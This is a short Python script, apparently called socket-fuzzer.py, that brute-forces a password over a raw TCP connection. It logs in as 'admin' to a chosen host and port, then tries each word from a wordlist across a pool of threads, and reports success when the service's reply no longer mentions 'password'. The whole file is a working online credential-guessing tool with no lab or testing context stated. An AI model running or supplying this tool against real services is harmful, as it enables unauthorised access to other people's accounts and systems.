import socket
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

if len(sys.argv) < 4:
    print("Usage: python socket-fuzzer.py <host> <port> <wordlist> [<threads>]")
    sys.exit(0)

host = sys.argv[1]
port = sys.argv[2]
wordlist_file = sys.argv[3]
threads = int(sys.argv[4]) if len(sys.argv) > 4 else 20

found_event = threading.Event()

def try_password(password):
    if found_event.is_set():
        return None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, int(port)))
        s.sendall(b'admin\n')
        s.recv(1024)
        s.sendall(password.encode() + b'\n')
        response = s.recv(1024).decode()
        s.close()
        if "password" not in response.lower():
            found_event.set()
            return password
    except (socket.error, socket.timeout):
        print(f"Connection error with password: {password}")
        pass
    return None

def password_generator():
    with open(wordlist_file) as wordlist:
        for password in wordlist:
            password = password.strip()
            if not password:
                continue
            if found_event.is_set():
                break
            yield password

def main():
    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_password = {executor.submit(try_password, password): password for password in password_generator()}
        for future in as_completed(future_to_password):
            result = future.result()
            if result:
                print(f"Password found: {result}")
                found_event.set()
                break

if __name__ == "__main__":
    main()